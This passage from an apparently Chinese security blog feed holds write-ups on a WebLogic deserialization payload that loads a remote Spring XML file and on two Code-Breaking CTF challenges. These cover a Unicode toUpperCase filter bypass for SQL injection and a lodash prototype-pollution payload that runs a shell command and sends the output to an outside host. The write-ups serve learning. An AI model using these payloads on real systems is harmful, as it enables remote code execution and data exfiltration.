href="#POC2-FileSystemXmlApplicationContext" class="headerlink" title="POC2-FileSystemXmlApplicationContext"></a>POC2-FileSystemXmlApplicationContext</h3><p>参考来源同上。<br>为了大致搞清楚这个类的利用流程，需要了解 spring bean 的大致逻辑。在 github 上寻找了一个 spring bean 核心部分<a href="https://github.com/greyireland/tiny-spring" target="_blank" rel="noopener">简化版</a>，能让我大致搞明白基本流程。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span><br><span class="line">    xmlns:wsa=<span class="string">"http://www.w3.org/2005/08/addressing"</span> xmlns:balisong=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;wsa:Action&gt;test&lt;/wsa:Action&gt;</span><br><span class="line">        &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">            &lt;class&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;void&gt;&lt;string&gt;http://172.16.170.1:8000/test.xml&lt;/string&gt;&lt;/void&gt;</span><br><span class="line">            &lt;/class&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;balisong:onAsyncDelivery&gt;calculator&lt;/balisong:onAsyncDelivery&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>这里利用 FileSystemXmlApplicationContext 的构造函数，传递了一个 http 地址。<br>通过调试知道在获取 Resource 的时候，FileSystemXmlApplication 会调用 DefaultResourceLoader.getResource</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Resource <span class="title">getResource</span><span class="params">(String location)</span> </span>&#123;</span><br><span class="line">        Assert.notNull(location, <span class="string">"Location must not be null"</span>);</span><br><span class="line">        <span class="keyword">if</span> (location.startsWith(<span class="string">"classpath:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ClassPathResource(location.substring(<span class="string">"classpath:"</span>.length()), <span class="keyword">this</span>.getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(location);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UrlResource(url);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException var3) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getResourceByPath(location);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>location 如果是一个合法 URL，则直接返回一个 URLResource，后续会调用 getInputStream 去获取内容。因为没有一个判断标准，所以这里好像是没法用于 GET 型的 SSRF 的。如果是文件相对地址的话，会返回一个 FileResource。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URLRESOURCE</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        URLConnection con = <span class="keyword">this</span>.url.openConnection();</span><br><span class="line">        con.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> con.getInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//FILERESOURCE</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FileInputStream(<span class="keyword">this</span>.file);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后面的工作就是解析 XML 文件返回 bean 对象。<br>因为 bean 提供一个 init-method 属性，他表现在 BeanDefinition 的 initMethodName 属性中，如果存在此属性，则会在导出对象时，通过反射进行调用。<br>虽然还有一个 destroyMethodName 属性，后续也可以利用来进行反射，但是需要 FileSystemXmlApplication 在执行 close 方法后才会进行反射调用，在构造函数中肯定是不会调用 close 的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章整体学习于 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&quot; target=&quot;_bla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Code-Breaking JS</title>
    <link href="http://yoursite.com/2018/11/25/Code-Breaking-JS/"/>
    <id>http://yoursite.com/2018/11/25/Code-Breaking-JS/</id>
    <published>2018-11-24T17:22:41.000Z</published>
    <updated>2020-07-07T02:09:52.549Z</updated>
    
    <content type="html"><![CDATA[<p>题目来自 “代码审计知识星球”（ p 师傅 ）<br> 学习  了  一下，做了两道关于 JS 的题</p><h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><p><code>safeKeyword</code> 过滤函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(&#x2F;(union|select|;|\-\-)&#x2F;is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对 <code>union|select|;|--</code> 进行了检测</p><p> 漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let user &#x3D; await ctx.db.get(&#96;SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; &#x3D; &#39;$&#123;username.toUpperCase()&#125;&#39; AND &quot;password&quot; &#x3D; &#39;$&#123;password.toUpperCase()&#125;&#39;&#96;)</span><br></pre></td></tr></table></figure><p>函数 <code>toUpperCase</code> 是存在一些特殊情况的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase()</span><br><span class="line">&quot;I&quot;</span><br><span class="line">&quot;ſ&quot;.toUpperCase()</span><br><span class="line">&quot;S&quot;</span><br></pre></td></tr></table></figure><p>即可绕过过滤函数。</p><h2 id="hard-thejs"><a href="#hard-thejs" class="headerlink" title="hard - thejs"></a>hard - thejs</h2><p>代码比较少，使用 <code>lodash</code> 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。猜测是 <code>merge</code> 有问题，查看版本，然后在 github 上搜索：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/15431599099637.jpg" alt="15431599099637"></p><p>发现一个有意思的。<br>增加一个 <code>safeGet</code> 函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function safeGet(object, key) &#123;</span><br><span class="line">    return key &#x3D;&#x3D; &#39;__proto__&#39;</span><br><span class="line">      ? undefined</span><br><span class="line">      : object[key];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>增加了判断原型属性的函数，没有的话可以进行原型污染。<br>开始看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res.render(&#39;index&#39;, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>想着原型污染有点不太可能，后来测试发现，<code>merge</code> 直接将注入的原型属性的值写到了最底层的 Object ,这样每创建一个对象，注入的对象都会在原型属性当中。<br>接下来寻找可以利用的点，查看 <code>template</code> 函数，发现<a href="https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089" target="_blank" rel="noopener">敏感的点</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; attempt(function() &#123;</span><br><span class="line">    return Function(importsKeys, sourceURL + &#39;return &#39; + source)</span><br><span class="line">      .apply(undefined, importsValues);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>继续找 <a href="https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1029" target="_blank" rel="noopener">可控点</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;</span><br></pre></td></tr></table></figure><p>其中 <code>option</code> 为我们在模版引擎中，渲染的值。这里读取其中的 <code>sourceURL</code> 属性的值，我们就可以通过原型污染，添加一个 <code>sourceURL</code> 属性并控制值，在拼接到 <code>Function</code> 中达到执行 JS 的目的。<br>模版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Function(&quot;&quot;,&quot;&#x2F;&#x2F;# sourceURL&#x3D;&#39;xxx&#39;\r\n[CODE]\r\n&quot;)();</span><br></pre></td></tr></table></figure><p>这里有个小 TIP ?：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/15431606816156.jpg" alt="-w716"><br>没法直接在 <code>Function</code> 中引入 <code>require</code>。查了一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var require &#x3D; global.require || global.process.mainModule.constructor._load</span><br></pre></td></tr></table></figure><p>所以原型污染 + 执行任意 JS。<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;xxx\r\nvar require &#x3D; global.require || global.process.mainModule.constructor._load;var result &#x3D; require(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag_thepr0t0js&#39;).toString();var req &#x3D; require(&#39;http&#39;).request(&#96;http:&#x2F;&#x2F;l0ca1.com&#x2F;$&#123;result&#125;&#96;);req.end();\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目来自 “代码审计知识星球”（ p 师傅 ）&lt;br&gt; 学习  了  一下，做了两道关于 JS 的题&lt;/p&gt;
&lt;h2 id=&quot;easy-nodechr&quot;&gt;&lt;a href=&quot;#easy-nodechr&quot; class=&quot;headerlink&quot; title=&quot;easy -
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
